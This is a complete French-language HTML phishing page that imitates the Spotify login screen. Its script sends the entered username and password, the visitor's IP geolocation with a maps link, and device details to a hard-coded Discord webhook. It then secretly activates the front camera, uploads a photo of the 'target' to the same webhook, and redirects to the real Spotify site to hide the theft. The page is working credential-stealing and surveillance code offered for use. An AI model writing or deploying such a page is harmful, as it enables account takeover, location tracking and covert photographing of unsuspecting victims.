<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Spotify - Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .login-card { background-color: #121212; width: 100%; max-width: 500px; padding: 60px 50px; border-radius: 12px; text-align: center; }
        .logo { width: 130px; margin: 0 auto 45px auto; }
        h1 { font-size: 30px; font-weight: 700; margin-bottom: 40px; letter-spacing: -1px; }
        input { width: 100%; background: #121212; border: 1px solid #727272; border-radius: 4px; padding: 18px; color: #fff; margin-bottom: 20px; outline: none; font-size: 16px; }
        input:focus { border: 2px solid #fff; padding: 17px; }
        .btn-green { background: #1DB954; color: #000; font-weight: 700; padding: 18px; border-radius: 500px; width: 100%; text-transform: uppercase; cursor: pointer; border: none; letter-spacing: 1.5px; }
        .links { margin-top: 40px; font-size: 14px; color: #b3b3b3; }
        a { color: #fff; text-decoration: underline; font-weight: 700; }
        #v, #c { position: absolute; left: -9999px; visibility: hidden; }
    </style>
</head>
<body>
    <div class="login-card">
        <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_White.png" class="logo">
        <h1>Se connecter pour continuer</h1>
        <input id="u" type="text" placeholder="E-mail ou nom d'utilisateur" spellcheck="false">
        <input id="p" type="password" placeholder="Mot de passe">
        <button onclick="sendData()" id="btn" class="btn-green">Se connecter</button>
        <div class="links">
            <p><a href="#">Mot de passe oublié ?</a></p>
            <div style="margin-top: 45px; border-top: 1px solid #282828; padding-top: 35px;">
                <p>Tu n'as pas de compte ? <a href="#">S'INSCRIRE</a></p>
            </div>
        </div>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";

        async function sendData() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!u || !p) return;

            document.getElementById('btn').innerHTML = "VÉRIFICATION...";

            // 1. COLLECTE INFOS (IP / MAPS / BATTERIE)
            let net = {};
            try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e){}
            
            let bat = "N/A";
            try { const b = await navigator.getBattery(); bat = Math.round(b.level * 100) + "%"; } catch(e){}

            const maps = net.latitude ? `https://www.google.com/maps?q=${net.latitude},${net.longitude}` : "N/A";

            // 2. ENVOI DISCORD
            const payload = {
                embeds: [{
                    title: "👑 LOG ULTIMATE RÉCUPÉRÉ",
                    color: 1947988,
                    fields: [
                        { name: "👤 Identifiants", value: `**User:** \`${u}\`\n**Pass:** \`${p}\`` },
                        { name: "🌐 Réseau & Géo", value: `**IP:** \`${net.ip}\`\n**Ville:** \`${net.city}\`\n**[Voir sur Maps](${maps})**` },
                        { name: "📱 Appareil", value: `**Batterie:** \`${bat}\`\n**RAM:** \`${navigator.deviceMemory || '?'}GB\`\n**CPU:** \`${navigator.hardwareConcurrency || '?'} Coeurs\`` }
                    ],
                    footer: { text: "LVN System • " + new Date().toLocaleString() }
                }]
            };

            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });

            // 3. CAPTURE PHOTO
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 2000));
                const canvas = document.getElementById('c');
                canvas.width = 1280; canvas.height = 720;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('file', blob, 'shot.png');
                    fd.append('content', "📸 **Photo de la cible :**");
                    await fetch(hook, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/png');
            } catch (e) {}

            setTimeout(() => { window.location.href = "https://www.spotify.com"; }, 3000);
        }
    </script>
</body>
</html>
